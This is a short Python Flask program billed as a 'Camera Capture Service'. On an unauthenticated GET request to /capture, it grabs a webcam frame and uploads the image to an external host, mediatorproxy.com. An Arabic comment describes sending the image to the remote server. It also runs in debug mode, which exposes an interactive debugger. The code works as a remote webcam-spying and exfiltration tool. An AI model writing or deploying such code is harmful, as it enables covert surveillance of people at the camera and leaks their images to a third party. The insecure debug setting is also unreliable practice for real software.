import cv2
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return "Camera Capture Service is Running"

@app.route('/capture', methods=['GET'])
def capture_image():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        filename = 'captured_image.png'
        cv2.imwrite(filename, frame)
        cap.release()
        # إرسال الصورة إلى الخادم البعيد
        url = 'https://mediatorproxy.com/upload.php'
        files = {'file': open(filename, 'rb')}
        response = requests.post(url, files=files)
        return jsonify({'status': 'success', 'message': 'Image captured and sent', 'response': response.text})
    else:
        cap.release()
        return jsonify({'status': 'error', 'message': 'Failed to capture image'})

if __name__ == '__main__':
    app.run(debug=True)
